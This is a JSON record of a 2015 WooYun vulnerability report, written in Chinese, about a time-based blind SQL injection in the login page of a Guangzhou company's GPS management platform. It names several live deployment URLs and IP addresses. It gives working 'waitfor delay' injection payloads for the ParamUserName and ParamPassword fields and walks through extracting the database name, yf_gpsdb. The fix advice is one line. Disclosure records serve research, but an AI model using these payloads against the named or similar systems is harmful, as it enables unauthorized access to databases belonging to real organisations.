{"id": 41089, "wybug_id": "wooyun-2015-089963", "wybug_title": "某卫星定位系统SQL注射漏洞", "wybug_corp": "广州市粤峰通讯科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-01-07 21:15", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 某卫星定位系统SQL注射漏洞 详细说明：  存在漏洞的是：广州市粤峰通讯科技有限公司(http://www.gps2008.com/index.php)基于位置服务（LBS）的综合管理信息服务平台——新坐标GPS综合应用管理平台案例：\nhttp://webgps.zrbeidou.com/http://www.mzbeidou.net/http://111.148.84.189/http://www.jstbd.com/http://www.zgbeidou.cn/http://219.132.138.5/http://221.204.11.226/\n漏洞详情：由于页面：/Default.aspx POST参数ParamUserName与ParamPassword未安全过滤导致的SQL注射漏洞\n/Default.aspxPOST DATA：判断当前数据库名长度:ParamValue=1&ParamUserName=' if(len(db_name()))>=8 waitfor delay '0:0:5' --%20&ParamPassword=3&ParamLoginType=MasterLoginParamValue=1&ParamUserName=' if(len(db_name()))>=9 waitfor delay '0:0:5' --%20&ParamPassword=3&ParamLoginType=MasterLogin判断当前数据库名第一个字符的ASCII码值：ParamValue=1&ParamUserName=' if(ascii(substring(db_name(),1,1)))>=121 WAITFOR DELAY '0:0:5'--%20&ParamPassword=3&ParamLoginType=MasterLoginParamValue=1&ParamUserName=' if(ascii(substring(db_name(),1,1)))>=122 WAITFOR DELAY '0:0:5'--%20&ParamPassword=3&ParamLoginType=MasterLogin\n参数ParamPassword利用方法与上面相同；漏洞复现：以 http://webgps.zrbeidou.com/ 参数：ParamUserName 为例：1.判断当前数据库名长度:a.当设置数据库名长度>=8时，页面存在延时，即判断条件成立\n\nb.当设置数据库名长度>=9时，页面不存在延时，即判断条件不成立，即数据库名长度为8\n\n2.判断当前数据库名第一个字符的ASCII码值：a.设置数据库名第一个字符的ASCII码值>=121时，页面存在延时，即判断成立\n\nb.设置数据库名第一个字符的ASCII码值>=122时，页面不存在延时，即判断不成立，即当前数据库名第一个字符的ASCII码值为121，即字符y\n\n根据此方法依次可得出数据库名各个位对应的ASCII码值121 102 95 103 112 115 100 98，即数据库名为yf_gpsdb   漏洞证明：  如上   修复方案：  对参数进行判断并过滤！！！   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}